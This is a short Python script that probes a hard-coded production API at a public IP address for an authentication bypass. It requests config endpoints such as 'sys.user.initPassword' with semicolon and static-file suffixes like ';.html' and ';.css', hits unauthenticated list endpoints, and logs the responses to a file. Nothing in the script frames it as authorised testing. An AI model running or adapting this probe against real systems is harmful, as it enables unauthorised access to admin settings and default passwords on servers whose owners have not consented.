import urllib.request, urllib.error, time
base="http://144.123.22.234:9080/prod-api"
tests=[
 "/system/config/configKey/sys.index.skinName;.html",
 "/system/config/configKey/sys.index.skinName;a=.html",
 "/system/config/configKey/sys.index.skinName;.js",
 "/system/config/configKey/sys.account.captchaEnabled;.html",
 "/system/config/configKey/sys.user.initPassword;.html",
 "/system/config/configKey/sys.user.initPassword;.css",
 "/system/config/configKey/sys.account.captchaEnabled.html",
 "/resource/email/code",
 "/system/config/configKey/",
 "/system/client/list",
 "/resource/oss/list",
]
log=open("cfgvariants.log","a")
for p in tests:
    req=urllib.request.Request(base+p, method="GET")
    try:
        r=urllib.request.urlopen(req, timeout=15); st=r.status; body=r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        st=e.code; body=e.read().decode("utf-8","replace")
    except Exception as e:
        st="ERR"; body=str(e)
    line=f"[{st}] {p} :: {body[:400]}"
    print(line); log.write(line+"\n"); log.flush()
    time.sleep(1.6)
log.close()
